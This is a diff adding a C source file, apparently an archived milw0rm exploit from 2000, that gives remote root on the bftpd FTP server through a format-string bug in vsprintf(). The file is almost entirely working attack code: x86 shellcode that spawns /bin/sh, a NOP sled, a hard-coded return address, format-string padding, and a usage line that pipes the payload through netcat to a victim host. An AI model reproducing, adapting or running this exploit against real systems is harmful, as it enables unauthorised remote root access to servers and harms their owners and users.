@@ -1,0 +1,71 @@
+/*
+ *  Copyright (c) 2000 - Security.is
+ *
+ *  The following material may be freely redistributed, provided
+ *  that the code or the disclaimer have not been partly removed,
+ *  altered or modified in any way. The material is the property
+ *  of security.is. You are allowed to adopt the represented code
+ *  in your programs, given that you give credits where it's due.
+ *
+ *  A no-name ftp-server has a serious bug which leads to remote root.
+ *  Anyway, we exploit vsprintf() via format-string.
+ *
+ *  Discovered/coded by: DiGiT - teddi@linux.is
+ *  Greets: security.is, ADM
+ *  note: Coded during security.is weekend ;>
+ *
+ *  Run like: (./bftpexp ; cat) | nc bftpd.victim.com 21
+ *  offset is optional and is arg1
+ * 
+ */
+
+#include <stdio.h>
+
+char shellcode[] =
+  "\x31\xc0\x31\xdb\x04\x0b\xcd\x80\x31\xc0\x40\x40\xcd\x80\x85"
+  "\xc0\x75\x28\x89\xd9\x31\xc0\x41\x04\x3f\xcd\x80\x31\xc0\x04"
+  "\x3f\x41\xeb\x1f\x31\xc0\x5f\x89\x7f\x08\x88\x47\x07\x89\x47"
+  "\x0c\x89\xfb\x8d\x4f\x08\x8d\x57\x0c\x04\x0b\xcd\x80\x31\xc0"
+  "\x31\xdb\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+#define ADDR 0xbffff83c
+
+int main(int argc, char *argv[]) 
+{
+  char lenbuf[1024],nopbuf[256], addrbuf[32], buf[256];
+  int offset=0,length, nopcount=100,i;
+  long nop_addr = ADDR;
+
+  if(argc > 1)
+    offset = atoi(argv[1]);
+
+  memset (nopbuf, '\x90', nopcount);
+  nop_addr = nop_addr + offset;
+
+  strcpy(buf, nopbuf);
+  strcat(buf, shellcode);
+
+  length=1024-strlen(shellcode)-nopcount+4-14;
+
+  strcat(buf, "%.");
+  sprintf(lenbuf, "%dd", length);
+  strcat(buf, lenbuf);
+
+  sprintf(addrbuf, "%c%c%c%c",
+    (unsigned char) ((nop_addr >>  0) & 0xff),
+    (unsigned char) ((nop_addr >>  8) & 0xff),
+    (unsigned char) ((nop_addr >> 16) & 0xff),
+    (unsigned char) ((nop_addr >> 24) & 0xff));
+
+  for(i = 0 ; i < 4 ; i++) 
+    strcat(buf, addrbuf);
+
+  fprintf(stderr, "Bftpd remote exploit, by DiGiT\n");
+  fprintf(stderr, "Using Address = 0x%x\n", nop_addr);
+  printf("%s\n", buf);
+
+  return 0;
+}
+
+
+// milw0rm.com [2000-11-29]
